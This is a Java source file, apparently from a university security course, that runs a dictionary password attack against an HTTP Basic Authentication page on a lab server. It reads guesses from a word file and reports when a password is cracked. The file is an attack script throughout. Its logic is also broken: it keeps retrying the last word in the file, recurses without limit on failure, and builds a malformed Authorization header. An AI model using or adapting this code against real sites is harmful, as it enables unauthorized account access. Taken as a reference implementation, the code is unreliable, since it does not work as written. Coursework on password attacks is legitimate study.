import java.net.*;
import java.io.*;

 public class Dictionary {
 int attempts = 0;
   URLConnection conn = null;

   public static void main (String args[]){

	Dictionary a = new Dictionary();
     a.attack(args);
     }

   public void attack(String args[]) {
   try {
       String login = new String("");
       String url = new String("http://sec-crack.cs.rmit.edu./SEC/2/index.php");
       String passwd = new String();


       passwd = getPasswd();
       BufferedReader in = new BufferedReader( new InputStreamReader (openURLForInput(new URL(url), login , passwd)));

       String line;
       while ((line = in.readLine()) != null) {
           System.out.println(line);
           }
           System.out.println("Password Cracked Successfully!!!");
           System.out.println("The passsword is :" + passwd + "and got after " +attempts + " tries");
       }
     catch (IOException e) {
  
      String r = new String(e.getMessage());
    if ( r != null)
    {
     System.out.println("Message :" +r);
     Dictionary a = new Dictionary();
     a.attack(args);
    }
     else
     {
	System.out.println("Trying again");
	Dictionary a = new Dictionary();
	a.attack(args);
     }
     }
   }
  public String getPasswd()
  {

 int i=0;int j=0;
 attempts++;
 int count =0;
 System.out.println("Passing dictionary word and waiting for URL reply....... ");
  String currentword = "";
  String se = "";
  try{
 FileInputStream reader = new FileInputStream ("words");
 DataInputStream in = new DataInputStream(reader);
 while (in.available() !=0)
{
 currentword = in.readLine();
 count++;
 
 
 }
 }
  catch( IOException e){}

  return currentword;
	 
         }



 public InputStream openURLForInput (URL url, String uname, String pword)
 throws IOException  {
     conn = url.openConnection();
     conn.setDoInput (true);
     conn.setRequestProperty ("Authorization", userNamePasswordBase64(uname,pword));
     conn.connect ();
     return conn.getInputStream();
     }


 public String userNamePasswordBase64(String username, String password) {
     return " " + base64Encode (username + ":" + password);
     }

 private final static char base64Array [] = {
       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
       'w', 'x', 'y', 'z', '0', '1', '2', '3',
       '4', '5', '6', '7', '8', '9', '+', '/'
  };

 private static String base64Encode (String string)    {
     String encodedString = "";
     byte bytes [] = string.getBytes ();
     int i = 0;
     int pad = 0;
     while (i < bytes.length) {
       byte b1 = bytes [i++];
       byte b2;
       byte b3;
       if (i >= bytes.length) {
          b2 = 0;
          b3 = 0;
          pad = 2;
          }
       else {
          b2 = bytes [i++];
          if (i >= bytes.length) {
             b3 = 0;
             pad = 1;
             }
          else
             b3 = bytes [i++];
          }
       byte c1 = (byte)(b1 >> 2);
       byte c2 = (byte)(((b1 & 0x3) << 4) | (b2 >> 4));
       byte c3 = (byte)(((b2 & 0xf) << 2) | (b3 >> 6));
       byte c4 = (byte)(b3 & 0x3f);
       encodedString += base64Array [c1];
       encodedString += base64Array [c2];
       switch (pad) {
         case 0:
          encodedString += base64Array [c3];
          encodedString += base64Array [c4];
          break;
         case 1:
          encodedString += base64Array [c3];
          encodedString += "=";
          break;
         case 2:
          encodedString += "==";
          break;
        }
       }
       return encodedString;
   }
 }

